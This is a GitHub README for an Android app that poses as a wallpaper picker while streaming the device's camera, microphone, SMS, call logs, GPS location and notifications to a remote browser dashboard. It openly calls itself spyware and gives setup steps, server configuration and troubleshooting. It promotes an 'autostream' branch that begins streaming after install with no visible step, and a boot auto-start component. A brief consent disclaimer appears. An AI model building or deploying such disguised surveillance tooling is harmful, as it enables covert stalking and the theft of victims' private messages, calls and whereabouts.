# 📱 Android Wallpaper & WebRTC Streaming App

<div align="center">
  <img src="./SpywareDashboard.gif" alt="App Demo" width="100%" />
</div>

<div align="center">
  <h3>🎨 Wallpaper Customization + 📡 Real-time Device Monitoring</h3>
  <p><em>A powerful dual-purpose Android application combining aesthetic customization with comprehensive device streaming capabilities</em></p>
</div>

---

## 🌟 Overview

This innovative Android application serves a **dual purpose**: it allows users to select and set stunning wallpapers on their device while simultaneously enabling **real-time streaming** of multiple device features to a web browser using **WebRTC technology**. 

The app leverages **Socket.IO** for signaling to establish secure peer-to-peer connections, making it perfect for:
- 🔍 **Remote monitoring Spyware** and device management
- 📱 **Live demonstrations** and presentations  
- 📊 **Real-time data streaming** (SMS, calls, location, notifications)
- 🎨 **Device personalization** with wallpapers

> **Key Technology**: WebRTC ensures low-latency, high-quality streaming directly between your Android device and web browser without intermediate servers processing your data.

> ⚖️ **Use responsibly**: Streaming camera, audio, SMS, call logs, notifications, and location data may be restricted by law. **Obtain informed consent** from the device owner and comply with all applicable regulations and platform policies.

## 🔀 Branch Variants

This repository has two maintained variants:

- **main** (you’re here): standard app with a **manual Streaming toggle** in *Streaming Settings*. Includes the **Node.js signaling server** in `Android-WebRTC-Spyware-Server/`.
- **autostream**: headless variant that **starts streaming automatically** after install and permission grant — **no manual toggle/UI step**. Ideal for kiosk/demo setups where you want hands-free bring-up.

➡️ Looking for auto-start behavior? Use the **autostream** branch:  
https://github.com/DhruvAthaide/Android_WebRTC_Spyware/tree/autostream

## ✨ Features

### 📷 **Advanced Camera Streaming**
- 📹 **High-Quality Video**: Streams camera feed at 640x480 resolution
- 🔄 **Dual Camera Support**: 
  - Front and back cameras displayed **simultaneously** on web dashboard
  - **Requirements**: Modern Android device + Android 9+ (API 28+)
  - **Auto-fallback**: Seamlessly switches to single camera on older devices
- ⚡ **Low Latency**: Real-time streaming with minimal delay

### 🎤 **Premium Audio Streaming**
- 🎧 **Real-time Transmission**: Live audio feed to web browser

### 📱 **Comprehensive Device Monitoring**
- 💬 **Live SMS Streaming**: Real-time message monitoring and display
- 📞 **Call Log Tracking**: Complete call history with timestamps
- 🗺️ **GPS Location Streaming**: Live location tracking with interactive map display
- 🔔 **Notification Monitoring**: Real-time notification feed from all apps

### 🌐 **Advanced WebRTC Technology**
- 🔐 **Peer-to-Peer Streaming**: Direct device-to-browser connection
- 🛡️ **STUN/TURN Support**: Reliable connection through NAT/firewall traversal
- ⚡ **Ultra-Low Latency**: Optimized for real-time performance
- 🔄 **Auto-Reconnection**: Intelligent connection recovery

### 💻 **Interactive Web Dashboard**
- 📊 **Real-time Status Updates**: Live connection and streaming status
- 🎮 **Responsive Interface**: Works seamlessly across all modern browsers
- 🎯 **Centralized Control**: All device streams in one comprehensive dashboard

## 🏗️ Project Architecture

```
📦 Android_WebRTC_Spyware/
├── 📱 app/
│   ├── 📝 src/main/java/com/example/wallpaperapplication/
│   │   ├── 🚀 BootReceiver.java              # Auto-start functionality
│   │   ├── ✅ ConsentActivity.java           # Permission management
│   │   ├── ⚙️ Constants.java                 # App configuration
│   │   ├── 🏠 MainActivity.java              # Main wallpaper interface
│   │   ├── 🔗 SdpObserverAdapter.java        # WebRTC SDP handling
│   │   ├── 📡 StreamingService.java          # Core streaming service
│   │   ├── ⚙️ StreamingSettingsActivity.java # Streaming controls
│   │   └── 🎨 WallpaperAdapter.java          # Wallpaper grid manager
│   ├── 📋 src/main/AndroidManifest.xml       # App permissions & config
│   ├── 🔒 src/main/res/xml/network_security_config.xml
│   └── 🔧 build.gradle.kts                   # Build configuration
├── 🖥️ Android-WebRTC-Spyware-Server/
│   ├── ⚡ server.js                          # Node.js signaling server
│   ├── 📦 package.json                       # Server dependencies
│   └── 🌐 public/
│       ├── 🎨 index.html                     # Web dashboard UI
│       └── 🔧 client.js                      # Browser WebRTC client
└── 📖 README.md                              # This documentation
```

### 🔧 **Core Components Explained**

| Component | Purpose | Key Features |
|-----------|---------|--------------|
| **🏠 MainActivity.java** | Wallpaper interface entry point | Grid view, wallpaper preview, system integration |
| **🎨 WallpaperAdapter.java** | Wallpaper gallery management | RecyclerView optimization, image loading, selection handling |
| **📡 StreamingService.java** | Heart of streaming functionality | WebRTC initialization, multi-stream capture, signaling |
| **⚙️ StreamingSettingsActivity.java** | User control interface | Permission requests, stream toggles, settings management |
| **🔒 AndroidManifest.xml** | Security & permissions | Camera, microphone, location, SMS permissions |
| **🔒 network_security_config.xml** | Network security | Cleartext traffic configuration for local server |
| **⚡ server.js** | WebRTC signaling hub | Socket.IO management, peer connection facilitation |
| **🎨 index.html & 🔧 client.js** | Web dashboard | Stream display, real-time updates, user interface |

## 📋 Prerequisites

### 📱 **Android Development**
- 💻 **Android Studio**: Latest version recommended (Arctic Fox+)
- 🛠️ **Android SDK**: 
  - **Minimum**: API 21+ (Android 5.0)
  - **Recommended**: API 28+ (Android 9.0) for dual camera support
- 📱 **Test Device**: Physical device or emulator with camera and microphone
- 🔄 **Dual Camera Requirements**: 
  - Modern Android device with concurrent camera access support
  - Android 9+ (API level 28+)
  - Multiple camera sensors capable of simultaneous streaming

### 🖥️ **Server Environment**
- 🟢 **Node.js**: Version 16.x or higher
- 📦 **npm**: Version 8.x or higher
- 💾 **Storage**: Minimal requirements (< 100MB)

### 🌐 **Browser Compatibility**
- ✅ **Chrome**: Version 80+ (Recommended)
- ✅ **Firefox**: Version 75+ 
- ✅ **Safari**: Version 13+
- ✅ **Edge**: Version 80+
- 📱 **Mobile browsers**: Full WebRTC support required

### 🌐 **TURN Server Access**
- 🔐 **Credentials**: Valid numb.viagenie.ca account (or alternative TURN provider)
- 🏠 **Local Network**: Devices on same network for optimal performance
- 🌍 **Remote Access**: TURN server required for cross-network connections

### 🔧 **Network Configuration**
- 📡 **Default Server IP**: Configure the Server IP Address by following the steps given below
- 🔌 **Port**: 3000 (configurable)
- 🛡️ **Firewall**: Ensure ports are accessible between devices
- ⚡ **Bandwidth**: Minimum 2 Mbps for smooth streaming

## 🚀 Quick Setup Guide

> Prefer auto-start streaming with no UI toggle? Switch to the **autostream** branch.

### 1️⃣ **Clone & Initialize**
```bash
# Clone the repository
git clone https://github.com/DhruvAthaide/Android_WebRTC_Spyware.git
cd Android_WebRTC_Spyware

# Verify project structure
ls -la
```

### 2️⃣ **Configure Android Application**

#### 📱 **Open in Android Studio**
1. Launch Android Studio
2. Open the `Android_WebRTC_Spyware` project
3. Wait for Gradle sync to complete

#### 🔧 **Update Dependencies** 
Verify `app/build.gradle.kts` contains all required dependencies for WebRTC and UI components.

#### 🔐 **Configure TURN Server Credentials**
In `StreamingService.java`, replace placeholders with your actual credentials (Optional):
```java
ice.add(PeerConnection.IceServer.builder("turn:numb.viagenie.ca")
    .setUsername("your-actual-username")      // 🔑 Replace with real username
    .setPassword("your-actual-password")      // 🔑 Replace with real password
    .createIceServer());
```

#### 🌐 **Update Server Configuration**
**In `StreamingService.java`**:
```java
private static final String SIGNALING_URL = "http://YOUR_SERVER_IP:3000";  // 🔧 Update IP
```

**In `network_security_config.xml`**:
```xml
<domain includeSubdomains="true">YOUR_SERVER_IP</domain>  <!-- 🔧 Update IP -->
```

#### ✅ **Verify Permissions**
Ensure `AndroidManifest.xml` includes all necessary permissions for streaming and wallpaper functionality.

---

### 3️⃣ **Setup Signaling Server**

#### 📁 **Navigate to Server Directory**
```bash
cd Android-WebRTC-Spyware-Server
```

#### 📦 **Install Dependencies**
```bash
npm install express socket.io@4.7.5
```

#### 🔐 **Configure Client-Side TURN**
In `public/client.js`, update TURN server credentials (Optional):
```javascript
const config = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { 
      urls: 'turn:numb.viagenie.ca', 
      username: 'your-actual-username',    // 🔑 Replace with real username
      credential: 'your-actual-password'   // 🔑 Replace with real password
    }
  ]
};
```

#### 🌐 **Update Socket.IO URL**
```javascript
const socket = io('http://YOUR_SERVER_IP:3000');  // 🔧 Update IP
```

---

### 4️⃣ **Launch the Server**
```bash
# Start the signaling server
node server.js

# Expected output:
# ✅ Server running at http://localhost:3000 or http://<Your Server IP Address>:3000
# 🔌 Socket.IO initialized and ready
```

---

### 5️⃣ **Build & Deploy Android App**

#### 🔨 **Build Process**
1. In Android Studio: **Build → Make Project**
2. Resolve any dependency issues
3. Ensure all configurations are properly set

#### 📱 **Installation & Usage**
1. **Deploy**: Run app on Android device or emulator (API 21+)
2. **Wallpaper Mode**: 
   - Browse wallpaper gallery on main screen
   - Tap wallpaper to preview
   - Apply to home/lock screen
3. **Streaming Mode**:
   - Navigate to streaming settings
   - Toggle streaming **ON**
   - Grant all requested permissions:
     - 📷 Camera access
     - 🎤 Microphone access  
     - 📍 Location access
     - 💬 SMS access
     - 📞 Phone access
     - 🔔 Notification access

---

### 6️⃣ **Access Web Dashboard**
```bash
# Open in browser:
http://YOUR_SERVER_IP:3000

# Expected features:
# 📹 Live camera stream(s)
# 🎤 Real-time audio
# 💬 SMS messages
# 📞 Call logs  
# 📍 GPS location with map
# 🔔 Live notifications
# 📊 Connection status indicators
```

> 💡 **Pro Tip**: Keep the Android app in the foreground initially to ensure all streams initialize properly. Once connected, you can minimize the app.

## 🔧 Debugging & Troubleshooting

### 📱 **Android Debugging**

#### **Logcat Monitoring**
```bash
# Monitor streaming service logs
adb logcat | grep StreamingService

# Monitor all app logs  
adb logcat | grep WallpaperApplication

# WebRTC specific logs
adb logcat | grep WebRTC
```

**🔍 Key Log Indicators:**
- ✅ `StreamingService initialized successfully`
- ✅ `WebRTC PeerConnection established`
- ❌ `Camera permission denied`
- ❌ `TURN server authentication failed`

#### **Common Android Issues & Solutions**

| Issue | Symptoms | Solution |
|-------|----------|----------|
| **📷 Camera not streaming** | Black screen in web dashboard | Check camera permissions, restart app |
| **🎤 No audio** | Silent stream | Verify microphone permissions, check device audio |
| **🔐 Permission errors** | App crashes or features disabled | Grant all permissions in Android settings |
| **🌐 Connection failed** | "Offline" status in dashboard | Verify server IP, check network connectivity |

---

### 🖥️ **Server Debugging**

#### **Enhanced Logging**
```bash
# Run server with detailed logs
DEBUG=socket.io* node server.js

# Log to file for analysis
node server.js > server.log 2>&1

# Monitor real-time connections
tail -f server.log | grep "Client connected"
```

**📊 Server Health Indicators:**
- ✅ `Server running at http://localhost:3000`
- ✅ `Socket.IO listening for connections`
- ✅ `Client connected: [socket-id]`
- ❌ `Port 3000 already in use`
- ❌ `Failed to bind to address`

---

### 🌐 **Browser Debugging**

#### **Developer Console**
1. Open browser DevTools (F12)
2. Navigate to **Console** tab
3. Look for WebRTC connection logs

**🔍 Browser Console Indicators:**
- ✅ `WebRTC connection established`
- ✅ `Receiving video stream`
- ✅ `Socket.IO connected to server`
- ❌ `Failed to establish peer connection`
- ❌ `ICE connection failed`

#### **Network Analysis**
1. **DevTools → Network tab**
2. **Filter**: WebSocket connections
3. **Monitor**: Socket.IO signaling messages

---

### 🚨 **Advanced Troubleshooting**

#### **Port & Network Issues**
```bash
# Check if port 3000 is available
netstat -tuln | grep 3000

# Test server connectivity
curl http://YOUR_SERVER_IP:3000

# Kill processes using port 3000
lsof -ti:3000 | xargs kill -9
```

#### **WebRTC Connection Analysis**
```javascript
// Add to browser console for detailed WebRTC stats
pc.getStats().then(stats => {
  stats.forEach(report => {
    if (report.type === 'candidate-pair' && report.state === 'succeeded') {
      console.log('✅ ICE Connection Success:', report);
    }
  });
});
```

#### **TURN Server Verification**
```bash
# Test TURN server connectivity
nslookup numb.viagenie.ca

# Alternative TURN servers for testing:
# stun:stun.l.google.com:19302
# stun:stun1.l.google.com:19302
```

## 📷 Camera Support Details

### 📱 **Single Camera Mode (Default)**
- ✅ **Compatibility**: Works on all supported Android devices (API 21+)
- 🔄 **Functionality**: Streams either front or back camera based on user selection
- ⚡ **Performance**: Optimized for older devices with limited hardware capabilities
- 🔋 **Battery Efficient**: Lower power consumption for extended streaming sessions

### 📹 **Dual Camera Mode (Advanced)**

#### **💻 System Requirements**
- 🔧 **Hardware**: Modern Android device with concurrent camera access support
- 📱 **OS Version**: Android 9+ (API level 28+) 
- 📷 **Camera Hardware**: Multiple sensors capable of simultaneous streaming
- 🧠 **Processor**: Sufficient CPU/GPU power for dual stream encoding

#### **✨ Features & Benefits**
- 🎥 **Simultaneous Streaming**: Both front and back cameras active at once
- 📊 **Dashboard Display**: Dual camera feeds shown side-by-side in web interface
- 🔄 **Smart Switching**: Automatic quality adjustment based on network conditions
- 📱 **Picture-in-Picture**: Configurable layout options for dual stream display

#### **🔍 Device Compatibility Check**
The app automatically detects dual camera support using:
```java
// Pseudo-code for dual camera detection
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P && 
    cameraManager.getCameraIdList().length >= 2) {
    // Enable dual camera mode
}
```

## ⚠️ Known Issues & Solutions

### 🔧 **Connection & Network Issues**

| Issue | Symptoms | Root Cause | Solution |
|-------|----------|------------|----------|
| **🚫 Connection Failures** | Dashboard shows "Offline" | TURN server/network issues | ✅ Verify TURN credentials<br/>✅ Check firewall settings<br/>✅ Test on same network first |
| **📡 Intermittent Disconnections** | Frequent reconnections | Unstable network/power saving | ✅ Disable battery optimization<br/>✅ Use 5GHz WiFi if available<br/>✅ Check router QoS settings |
| **🐌 Slow Streaming** | Laggy video/audio | Bandwidth limitations | ✅ Reduce stream quality<br/>✅ Close other network apps<br/>✅ Use wired connection for server |

### 📱 **Android-Specific Issues**

| Issue | Symptoms | Root Cause | Solution |
|-------|----------|------------|----------|
| **📷 Camera Black Screen** | Video shows black | Permission/hardware conflict | ✅ Restart app completely<br/>✅ Check camera permissions<br/>✅ Close other camera apps |
| **🎤 Audio Not Streaming** | Silent dashboard | Microphone access denied | ✅ Grant microphone permission<br/>✅ Check system audio settings<br/>✅ Test with headphones |
| **🔄 Dual Camera Failure** | Only one camera works | Hardware/OS limitations | ✅ Verify Android 9+<br/>✅ Check device specifications<br/>✅ Test single camera mode |
| **⚡ App Crashes** | Unexpected shutdowns | Memory/resource issues | ✅ Restart device<br/>✅ Clear app cache<br/>✅ Update Android WebView |

### 🖥️ **Server & Browser Issues**

| Issue | Symptoms | Root Cause | Solution |
|-------|----------|------------|----------|
| **🖥️ Server Won't Start** | Port binding errors | Port already in use | ✅ Kill processes on port 3000<br/>✅ Use alternative port<br/>✅ Check system firewall |
| **🌐 Browser Compatibility** | Features not working | WebRTC support missing | ✅ Use Chrome/Firefox latest<br/>✅ Enable hardware acceleration<br/>✅ Clear browser cache |
| **📊 Dashboard Not Loading** | Blank page/errors | JavaScript/network issues | ✅ Check browser console<br/>✅ Disable ad blockers<br/>✅ Try incognito mode |

---


## 📜 License

```
MIT License

Copyright (c) 2025 Android WebRTC Streaming App

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

<div align="center">

## 🌟 **Star this repository if you found it helpful!**

### 🤝 **Contributing**
I welcome any contributions! Please feel free to submit pull requests, report bugs, or suggest new features.

### 📞 **Support**
🐛 **Bug Reports**: [GitHub Issues](https://github.com/DhruvAthaide/Android_WebRTC_Spyware/issues)
<br>💬 **Discussions**: [GitHub Discussions](https://github.com/DhruvAthaide/Android_WebRTC_Spyware/discussions)

---

*Built with ❤️ using WebRTC, Android, and Node.js*

</div>